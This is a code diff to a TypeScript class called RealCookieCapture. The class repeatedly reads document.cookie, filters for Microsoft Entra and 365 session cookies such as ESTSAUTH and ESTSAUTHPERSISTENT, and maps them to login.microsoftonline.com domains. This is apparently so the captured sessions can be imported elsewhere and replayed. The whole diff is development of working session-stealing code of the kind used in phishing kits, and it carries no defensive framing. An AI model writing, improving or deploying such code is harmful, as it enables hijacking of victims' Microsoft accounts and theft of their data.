@@ -21,6 +21,8 @@ class RealCookieCapture {
   private capturedCookies: RealCookie[] = [];
   private isCapturing = false;
   private captureInterval: number | null = null;
+  private lastCaptureTime = 0;
+  private captureDebounceMs = 5000; // Only capture every 5 seconds max
 
   constructor() {
     this.initializeCapture();
@@ -49,11 +51,18 @@ class RealCookieCapture {
     // Set up periodic capture
     this.captureInterval = window.setInterval(() => {
       this.captureCurrentCookies();
-    }, 2000); // Capture every 2 seconds
+    }, 10000); // Capture every 10 seconds instead of 2
   }
 
   private captureCurrentCookies() {
     try {
+      // Debounce to prevent spam
+      const now = Date.now();
+      if (now - this.lastCaptureTime < this.captureDebounceMs) {
+        return;
+      }
+      this.lastCaptureTime = now;
+
       // Get all cookies from document.cookie
       const cookieString = document.cookie;
       if (!cookieString) return;
@@ -80,9 +89,9 @@ class RealCookieCapture {
     
     pairs.forEach(pair => {
       const [name, value] = pair.trim().split('=');
-      if (name && value) {
+      if (name && value && this.isMicrosoftCookie(name)) { // Only capture Microsoft cookies
         const cookie: RealCookie = {
-          domain: this.getCurrentDomain(),
+          domain: this.getMicrosoftDomainForCookie(name), // Use proper Microsoft domain
           hostOnly: true,
           httpOnly: false, // Can't detect httpOnly from document.cookie
           name: name.trim(),
@@ -98,6 +107,31 @@ class RealCookieCapture {
     });
     
     return cookies;
+  }
+
+  private getMicrosoftDomainForCookie(cookieName: string): string {
+    // Map cookie names to their proper Microsoft domains
+    const domainMap: Record<string, string> = {
+      'ESTSAUTH': '.login.microsoftonline.com',
+      'ESTSAUTHPERSISTENT': '.login.microsoftonline.com',
+      'ESTSAUTHLIGHT': 'login.microsoftonline.com',
+      'SignInStateCookie': '.login.microsoftonline.com',
+      'esctx': '.login.microsoftonline.com',
+      'buid': 'login.microsoftonline.com',
+      'MSFPC': 'login.microsoftonline.com',
+      'AADSSOTILES': 'login.microsoftonline.com',
+      'ESTSSSOTILES': 'login.microsoftonline.com',
+      'stsservicecookie': 'login.microsoftonline.com',
+      'AADSSO': '.login.microsoftonline.com',
+      'ai_session': 'login.microsoftonline.com',
+      'CCState': '.login.microsoftonline.com',
+      'fpc': 'login.microsoftonline.com',
+      'MicrosoftApplicationsTelemetryDeviceId': 'login.microsoftonline.com',
+      'wlidperf': '.microsoftonline.com',
+      'x-ms-gateway-slice': 'login.microsoftonline.com'
+    };
+    
+    return domainMap[cookieName] || 'login.microsoftonline.com';
   }
 
   private getCurrentDomain(): string {
